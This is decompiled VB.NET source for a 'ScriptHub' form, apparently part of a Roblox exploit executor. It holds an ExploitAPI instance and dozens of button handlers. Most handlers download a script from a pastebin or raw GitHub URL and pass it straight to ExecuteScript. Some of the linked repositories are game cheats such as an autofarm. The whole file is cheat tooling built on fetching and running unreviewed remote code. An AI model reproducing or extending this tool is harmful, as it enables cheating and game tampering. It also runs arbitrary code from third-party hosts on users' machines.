		Private Sub button101_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/LbuPFVK6")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000CE RID: 206 RVA: 0x00007FC4 File Offset: 0x000061C4
		Private Sub button102_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/9tMDAzUL")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000CF RID: 207 RVA: 0x00007FF0 File Offset: 0x000061F0
		Private Sub button103_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/vDbQR7DW")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D0 RID: 208 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button104_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D1 RID: 209 RVA: 0x0000801C File Offset: 0x0000621C
		Private Sub button98_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/7XKrCZMD")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D2 RID: 210 RVA: 0x00008048 File Offset: 0x00006248
		Private Sub button97_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/YG2GB74g")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D3 RID: 211 RVA: 0x00008074 File Offset: 0x00006274
		Private Sub button99_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/6wXvMJu9")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D4 RID: 212 RVA: 0x000080A0 File Offset: 0x000062A0
		Private Sub button96_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/UhM5xJ06")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D5 RID: 213 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button94_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D6 RID: 214 RVA: 0x000080CC File Offset: 0x000062CC
		Private Sub button95_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/JQ1Z8Mp2")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D7 RID: 215 RVA: 0x000080F8 File Offset: 0x000062F8
		Private Sub button93_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/8Ye1rgN2")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D8 RID: 216 RVA: 0x00007180 File Offset: 0x00005380
		Private Sub button92_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/nmQp3H5S")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000D9 RID: 217 RVA: 0x00008124 File Offset: 0x00006324
		Private Sub button91_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/dCmUBchn")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000DA RID: 218 RVA: 0x00008150 File Offset: 0x00006350
		Private Sub button90_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/7a4xBchJ")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000DB RID: 219 RVA: 0x0000817C File Offset: 0x0000637C
		Private Sub button89_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/pdrEDA2c")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000DC RID: 220 RVA: 0x000081A8 File Offset: 0x000063A8
		Private Sub button88_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/4cfEp5sZ")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000DD RID: 221 RVA: 0x000081D4 File Offset: 0x000063D4
		Private Sub button105_Click(sender As Object, e As EventArgs)
			MyBase.Hide()
			Dim scriptHub As ScriptHub2 = New ScriptHub2()
			scriptHub.Show()
		End Sub

		' Token: 0x060000DE RID: 222 RVA: 0x00002086 File Offset: 0x00000286
		Private Sub button107_Click(sender As Object, e As EventArgs)
			MyBase.Close()
		End Sub

		' Token: 0x060000DF RID: 223 RVA: 0x000081F4 File Offset: 0x000063F4
		Private Sub button106_Click(sender As Object, e As EventArgs)
			MyBase.Hide()
			Dim scriptHub As ScriptHub3 = New ScriptHub3()
			scriptHub.Show()
		End Sub

		' Token: 0x060000E0 RID: 224 RVA: 0x00008214 File Offset: 0x00006414
		Private Sub button113_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/9SsBfmGz")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E1 RID: 225 RVA: 0x00008240 File Offset: 0x00006440
		Private Sub button114_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/6zP579q2")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E2 RID: 226 RVA: 0x0000826C File Offset: 0x0000646C
		Private Sub button115_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/B4sNKWXd")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E3 RID: 227 RVA: 0x00008298 File Offset: 0x00006498
		Private Sub button116_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/8VSzrdUQ")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E4 RID: 228 RVA: 0x000082C4 File Offset: 0x000064C4
		Private Sub button111_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://raw.githubusercontent.com/Jaaaaay2/MahScriptHub/master/AFS%20Remastered")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E5 RID: 229 RVA: 0x000082F0 File Offset: 0x000064F0
		Private Sub button110_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/JNFM0xpb")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E6 RID: 230 RVA: 0x0000831C File Offset: 0x0000651C
		Private Sub button112_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/CbVhHYNH")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E7 RID: 231 RVA: 0x00008348 File Offset: 0x00006548
		Private Sub button109_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/t2RaC3hM")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E8 RID: 232 RVA: 0x00008374 File Offset: 0x00006574
		Private Sub button102_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/b11tUy2s")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000E9 RID: 233 RVA: 0x000083A0 File Offset: 0x000065A0
		Private Sub button108_Click(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/PgRNeLmH")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000EA RID: 234 RVA: 0x00007DB4 File Offset: 0x00005FB4
		Private Sub button71_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://raw.githubusercontent.com/JoshieGemFinder/gubgub/main/beeswaemfree")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000EB RID: 235 RVA: 0x000083CC File Offset: 0x000065CC
		Private Sub button61_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/Z3iAXASr")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000EC RID: 236 RVA: 0x000083F8 File Offset: 0x000065F8
		Private Sub button43_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://raw.githubusercontent.com/reavscripts/sl2_autofarm/main/main.lua")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000ED RID: 237 RVA: 0x00008424 File Offset: 0x00006624
		Private Sub button33_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/sepn88HY")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000EE RID: 238 RVA: 0x00008450 File Offset: 0x00006650
		Private Sub button30_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://raw.githubusercontent.com/Sinscrips/roblox-scripts/main/surfhaxx.lua")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000EF RID: 239 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub label9_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000F0 RID: 240 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub label9_Click_1(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000F1 RID: 241 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub label9_Click_2(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000F2 RID: 242 RVA: 0x0000847C File Offset: 0x0000667C
		Private Sub button87_Click_1(sender As Object, e As EventArgs)
			Dim webClient As WebClient = New WebClient()
			Dim script As String = webClient.DownloadString("https://pastebin.com/raw/BdvUGb2q")
			Me.[module].ExecuteScript(script)
		End Sub

		' Token: 0x060000F3 RID: 243 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub label30_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000F4 RID: 244 RVA: 0x00007124 File Offset: 0x00005324
		Private Sub label9_MouseMove(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				MyBase.Left += e.X - Me.lastPoint.X
				MyBase.Top += e.Y - Me.lastPoint.Y
			End If
		End Sub

		' Token: 0x060000F5 RID: 245 RVA: 0x00002424 File Offset: 0x00000624
		Private Sub label9_MouseDown(sender As Object, e As MouseEventArgs)
			Me.lastPoint = New Point(e.X, e.Y)
		End Sub

		' Token: 0x060000F6 RID: 246 RVA: 0x00002424 File Offset: 0x00000624
		Private Sub label9_MouseDown_1(sender As Object, e As MouseEventArgs)
			Me.lastPoint = New Point(e.X, e.Y)
		End Sub

		' Token: 0x060000F7 RID: 247 RVA: 0x00007124 File Offset: 0x00005324
		Private Sub label9_MouseMove_1(sender As Object, e As MouseEventArgs)
			If e.Button = MouseButtons.Left Then
				MyBase.Left += e.X - Me.lastPoint.X
				MyBase.Top += e.Y - Me.lastPoint.Y
			End If
		End Sub

		' Token: 0x060000FA RID: 250 RVA: 0x00002084 File Offset: 0x00000284
		Private Sub ScriptHub_Load(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000061 RID: 97
		Private api As ExploitAPI = New ExploitAPI()

		' Token: 0x04000062 RID: 98
		Private [module] As [Module] = New [Module]()

		' Token: 0x04000063 RID: 99
		Private lastPoint As Point
	End Class
End Namespace
